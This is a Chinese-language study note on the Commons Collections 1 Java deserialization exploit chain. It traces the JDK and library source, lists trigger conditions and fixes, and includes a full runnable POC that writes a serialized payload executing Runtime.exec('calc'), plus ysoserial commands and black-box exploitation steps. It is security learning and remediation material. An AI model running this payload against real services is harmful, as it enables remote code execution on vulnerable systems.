# CC1 利用链（Commons Collections 1 反序列化命令执行链）

> [!abstract] 原理一句话
> 用 JDK 动态代理把 `LazyMap` 包装成普通 `Map`，塞进 JDK 内部类 `AnnotationInvocationHandler` 的 `memberValues` 字段；反序列化恢复注解处理器时，JDK 会调用代理的 `entrySet()` 做"例行盘点"，代理把这次调用转发给 handler 的 `invoke()`，default 分支翻译为 `memberValues.get("entrySet")` → `LazyMap.get()`，顺着 `ChainedTransformer` 反射执行 `Runtime.exec()`。

完整调用顺序（ysoserial 源码原文）：
```text
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
```

前置阅读：[[URLDNS利用链]]（先用它探测反序列化入口是否存在）、[[ysoserial使用]]
中后段命令执行引擎与 [[CC5利用链]] 完全相同，详解见其 §2.3–2.5。

---
## 1. CC1 是怎么来的

### 1.1 概括

CC1 是 ysoserial 的"开国元勋"链（2015 年 frohoff 公开），第一次完整演示了「commons-collections 的 Transformer 体系 + JDK 自带类入口」这一组合拳。入口用的是 JDK 内部类 `sun.reflect.annotation.AnnotationInvocationHandler`——JDK 8u71 官方改写了它的 `readObject()` 之后，CC1 当场失效，这才逼出 CC5、CC6 这些"换入口不换引擎"的后续链。

### 1.2 比喻

注解处理器像一个「仓库管理员」，每次上班（反序列化恢复）都要做例行盘点：把 `memberValues` 这本账本的每一条目（`entrySet()`）从头到尾翻一遍。攻击者把账本换成一本「遥控账簿」（动态代理）——管理员每翻一条，遥控器就把动作转交给一台通电就跑的机器（LazyMap → ChainedTransformer）。JDK 8u71 之后管理员学聪明了：盘点先验明正身、出错直接跳过，遥控账簿再也骗不动他。

### 1.3 细节：为什么用动态代理当跳板

- `AnnotationInvocationHandler` 自己实现了 `InvocationHandler`，还持有 `Map memberValues` 字段——把**代理对象**塞进这个字段，反序列化期间对 memberValues 的任何方法调用都会绕回 handler 的 `invoke()`。
- `invoke()` 的 default 分支 `memberValues.get(member)`，把**任意无参方法调用**翻译成一次 `get`——这就是通向 `LazyMap.get()` 的桥。
- 所以 payload 是双层结构：**外层 handler 的 memberValues 是代理 Map，代理的 handler 里又包着 LazyMap**（见 4.2），绕一圈只为让 JDK 主动替我们调一次方法。

> [!note] 说明
> CC1 与 CC5/CC6 的命令执行引擎（LazyMap + ChainedTransformer）一模一样，唯一区别是**入口到 LazyMap.get 的路径**。学透 CC1 再看 CC5，等于只学一个新入口。

---

## 2. 原理跟踪：逐段源码走读

### 2.1 入口：AnnotationInvocationHandler.readObject()（JDK ≤ 8u71 源码）

```java
// sun.reflect.annotation.AnnotationInvocationHandler —— JDK 内部类（sun.* 包）
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();                       // 正常恢复 type / memberValues 字段
    AnnotationType var2 = AnnotationType.getInstance(this.type);
    Map var3 = var2.memberTypes();
    Iterator var4 = this.memberValues.entrySet().iterator(); // ⭐⭐ 对 memberValues（我们的代理 Map）调用 entrySet()
    while (var4.hasNext()) {
        Map.Entry var5 = (Map.Entry) var4.next();
        Class var6 = (Class) var3.get(var5.getKey());
        if (var6 != null) { /* 校验注解成员类型，略 */ }
    }
}
```

- 这段代码**没有任何防护**：拿到 memberValues 就直接调 `entrySet()`，这是 CC1 能成立的全部原因。
- JDK 8u71+ 改写为：先 `readFields()` 取值，再对成员名逐个 `memberValues.get(name)` 并用 try/catch 整体包裹、不匹配即跳过——不再无脑遍历代理对象，链断。

### 2.2 跳板：动态代理 → AnnotationInvocationHandler.invoke()

```java
// AnnotationInvocationHandler 实现的 InvocationHandler 接口
public Object invoke(Object proxy, Method method, Object[] args) {
    String member = method.getName();
    Class<?>[] paramTypes = method.getParameterTypes();

    if (member.equals("equals") && paramTypes.length == 1 && paramTypes[0] == Object.class)
        return equalsImpl(args[0]);
    if (paramTypes.length != 0)
        throw new AssertionError("Too many parameters for an annotation method");

    switch (member) {
        case "toString":        return toStringImpl();
        case "hashCode":        return hashCodeImpl();
        case "annotationType":  return type;
    }

    // ⭐⭐ entrySet 不在四个特例里 → 走 default 分支：memberValues.get("entrySet")
    Object result = memberValues.get(member);
    // 后续是对 result 做注解类型校验/拆箱，与链无关，略
    return result;
}
```

- 代理收到 `entrySet()` → 转发给 handler 的 `invoke()` → `entrySet` 不是特例方法 → default 分支执行 `memberValues.get("entrySet")`。
- 这里的 `memberValues` 是 handler 内部包着的 **LazyMap**，且 innerMap 里==没有 `"entrySet"` 这个 key== → 必然触发懒加载。
- 这一层的作用：把上游的**任意无参方法调用**翻译成 **get 调用**（CC5 的 TiedMapEntry 翻译 toString → get，CC1 的代理翻译 任意方法 → get，思路相同）。

### 2.3 命令执行引擎（与 CC5 完全同款）

- `LazyMap.get()` 懒加载陷阱：见 [[CC5利用链]] §2.3。
- `ChainedTransformer + InvokerTransformer` 反射接力：见 [[CC5利用链]] §2.4。
- Transformer 流水线四步曲（Runtime.class → getMethod → invoke → exec）：见 [[CC5利用链]] §2.5，Transformer 数组**一模一样**，不重复展开。

---

## 3. 触发条件

| 条件 | 说明 | 黑盒怎么判断 |
|------|------|--------------|
| classpath 上有 commons-collections 3.0~3.2.1 | 命令执行引擎依赖 | 报错堆栈泄露包名、依赖指纹、已知组件版本 |
| 存在反序列化入口 | 业务代码对用户可控数据调用 `ObjectInputStream.readObject()` | 流量中出现 `rO0AB`（Base64）或 `AC ED 00 05`（二进制头） |
| ==JDK ≤ 8u71== | 8u71 改写 `AnnotationInvocationHandler.readObject`，链断 | 报错页/Server 头泄露 JDK 版本；老旧系统命中率才高 |
| 无额外防护 | 无 JEP 290 过滤器 / 依赖未升级到 3.2.2+ | — |

> [!warning] JDK 版本是硬门槛
> CC1 只在 **JDK ≤ 8u71**（以及同期的 JDK 7/6）上触发。8u71 之后入口类被修复，payload 打过去是**哑火**的（静默反序列化成功、无命令执行、无报错）。所以 CC1 的实战价值集中在老旧系统；面对新 JDK 请直接换 [[CC5利用链]] / CC6 / [[CC7利用链]]。

---

## 4. 实操复现

### 4.1 环境准备

- 触发侧需要 **JDK ≤ 8u71**（本机 `D:\code\Env\java8\JDK` 是 8u331，⭐ 只能用来**生成 payload 和学链结构，无法本地触发**；要完整复现触发，用 Docker/虚拟机装老 JDK，或直接用公开靶场）
- commons-collections 3.2.1 jar：`D:\code\libs\commons-collections-3.2.1.jar`
- IDEA（打断点跟调用链用）

### 4.2 手写 POC（完整可运行，生成 payload）

```java
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

public class CC1Poc {
    public static void main(String[] args) throws Exception {
        // ⭐ 第一步：哑弹链占位——组装期防止意外触发提前引爆
        ChainedTransformer chain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });

        // ⭐ 第二步：真引信（四步反射接力，与 CC5 §2.5 完全相同）
        Transformer[] realChain = new Transformer[]{
                new ConstantTransformer(Runtime.class),                 // ① 送入 Runtime.class
                new InvokerTransformer("getMethod",
                        new Class[]{ String.class, Class[].class },
                        new Object[]{ "getRuntime", new Class[0] }),    // ② getMethod("getRuntime")
                new InvokerTransformer("invoke",
                        new Class[]{ Object.class, Object[].class },
                        new Object[]{ null, new Object[0] }),           // ③ invoke(null) 拿 Runtime 实例
                new InvokerTransformer("exec",
                        new Class[]{ String.class },
                        new Object[]{ "calc" }),                        // ④ exec("calc")
                new ConstantTransformer(1) };                           // ⑤ 收尾：吞掉 Process 返回值

        // ⭐ 第三步：LazyMap 装饰（innerMap 不含 "entrySet"，保证 get 必然触发 transform）
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);

        // ⭐ 第四步：反射拿到 JDK 内部类 AnnotationInvocationHandler 的构造器
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);   // ⭐ JDK 8 下可直接反射 sun.* 类（JDK 9+ 模块系统会拦）

        // ⭐ 第五步：内层 handler——memberValues 埋 LazyMap
        InvocationHandler innerHandler = (InvocationHandler) ctor.newInstance(
                java.lang.annotation.Target.class, lazyMap);   // 注解类型随便选个 JDK 自带的即可

        // ⭐ 第六步：动态代理——把"方法调用"转交给内层 handler 的 invoke()
        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(), new Class[]{ Map.class }, innerHandler);

        // ⭐ 第七步：外层 handler——memberValues 埋代理 Map，最终 payload
        Object payload = ctor.newInstance(java.lang.annotation.Target.class, proxyMap);

        // ⭐ 第八步：离手前换真引信
        Field tfField = ChainedTransformer.class.getDeclaredField("iTransformers");
        tfField.setAccessible(true);
        tfField.set(chain, realChain);

        // ⭐ 第九步：序列化落盘（此过程在新 JDK 上也能正常执行，只是打旧 JDK 才触发）
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc1.bin"));
        oos.writeObject(payload);
        oos.close();
        System.out.println("payload 写入 cc1.bin");

        // ⭐ 第十步：本地反序列化验证——仅 JDK ≤ 8u71 会弹计算器；8u71+ 静默哑火（正常现象）
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc1.bin"));
        ois.readObject();
    }
}
```

编译运行（裸 javac 方式，JDK 8 + jar 在 classpath）：

```bash
# ⭐ 编译（-encoding UTF-8 防止中文注释乱码）
"D:\code\Env\java8\JDK\bin\javac" -encoding UTF-8 -cp "D:\code\libs\commons-collections-3.2.1.jar" CC1Poc.java

# ⭐ 运行（Windows 下 classpath 分隔符是分号）
"D:\code\Env\java8\JDK\bin\java" -cp ".;D:\code\libs\commons-collections-3.2.1.jar" CC1Poc
```

> [!bug] 两个新手必踩的坑
> ① **在新 JDK 上本地验证 = 永远哑火**：8u331 上 `readObject()` 走完 payload 反序列化成功、什么都不发生，这不是 POC 写错了，是入口类已被修复。判断 POC 是否正确的标准：序列化能正常完成 + 文件头是 `AC ED 00 05`。
> ② **哑弹链同样不能省**：虽然 CC1 组装期没有 CC6 那种 `HashSet.add` 的强制触发点，但 IDEA 调试器查看变量时会自动调 `toString()`，经代理转发成 `get()` 一样会引爆——防御性写法全链通用。

### 4.3 调试跟踪（原理验证）

在 **JDK ≤ 8u71** 环境下按顺序打断点：

| # | 断点位置 | 观察点 |
|---|----------|--------|
| 1 | `AnnotationInvocationHandler.readObject` | `memberValues` 的类型是 `$Proxy0`（动态代理类）；单步进入 `entrySet()` |
| 2 | `AnnotationInvocationHandler.invoke` | `member = "entrySet"`，确认落入 default 分支 |
| 3 | `LazyMap.get` | `containsKey("entrySet") == false` → 进入 `factory.transform(key)` |
| 4 | `ChainedTransformer.transform` | for 循环 5 次，object 逐步变身（同 CC5 §4.3） |
| 5 | `InvokerTransformer.transform` | `method.invoke` 执行前看 method 名：getMethod → invoke → exec |

### 4.4 用 ysoserial 一键生成 + 黑盒定位思路

```bash
# ⭐ 生成 CC1 payload（命令按目标场景替换）
java -jar ysoserial.jar CommonsCollections1 "calc" > cc1.bin
```

黑盒实战中的定位思路（与 CC5 §4.4 相同，区别在第 3 步之后）：

1. **找入口**：流量里出现 `rO0AB` / `AC ED 00 05` → 存在反序列化点。
2. **探回显**：先打 [[URLDNS利用链]]，DNSLog 收到请求 = 入口确认可达。
3. **验依赖 + 验 JDK 版本**：确认 commons-collections 3.x；⭐ 再确认 JDK ≤ 8u71（否则换 CC5/CC7）。
4. **上执行**：换 CC1 payload，先用 DNSLog/延时验证，再考虑交互。

---

## 5. 修复方案

修复思路与 [[CC5利用链]] §5 完全一致（同一个引擎，同一份药方），核心两条：

| 层面 | 措施 | 说明 |
|------|------|------|
| 依赖库（根治） | commons-collections 升级 **3.2.2+**（或 collections4 4.1+） | functor 反序列化默认禁用，链断在第一环 |
| 业务层（根治） | 不对不可信数据 `readObject()` | 复杂结构传输改用 JSON 等无代码语义的协议 |
| JDK 侧 | 升级到 8u71+（只挡住 CC1 这一条） | ==治标不治本==：CC5/CC6/CC7 全部绕过，不能作为防御依据 |
| JDK 侧 | JEP 290 序列化过滤器（8u121+） | 黑/白名单拒绝 CC 危险类 |

> [!important] 关键结论
> CC1 的历史意义大于实战意义：它让业界第一次看清「反序列化漏洞的根不在入口类，而在 classpath 上的危险库」。JDK 修掉 CC1 入口后，CC5/CC6 立刻用别的入口复活同一条引擎——**修入口修不死，得修库本身**。

---

## 6. 与姊妹链的关系

CC1 / CC5 / CC6 的入口、触发动作、JDK 限制逐项对比见 [[CC5利用链]] §6，此处只记 CC1 独有的两个标签：

- ==唯一有 JDK 版本硬限制的 CC 链==（≤ 8u71），其余 CC 链基本不限 JDK。
- ==唯一使用动态代理跳板的 CC 链==：toString / hashCode 跳板（CC5/CC6/CC7）都是具体类的固定方法，CC1 的代理则能把"任意无参方法"都翻译成 get，设计上最"优雅"，也最先被官方定点清除。

---

## 本篇关联

- 前置知识：[[URLDNS利用链]] —— 反序列化入口探测，黑盒第一步
- 工具使用：[[ysoserial使用]] —— 一键生成 CC1 payload
- 同族利用链：[[CC5利用链]]（高版本 JDK 平替）、[[CC7利用链]]（纯公开 API 入口）、[[CC6利用链]]（待补笔记）

> 本笔记仅用于授权测试与安全学习，未经授权对他人系统测试属于违法行为。
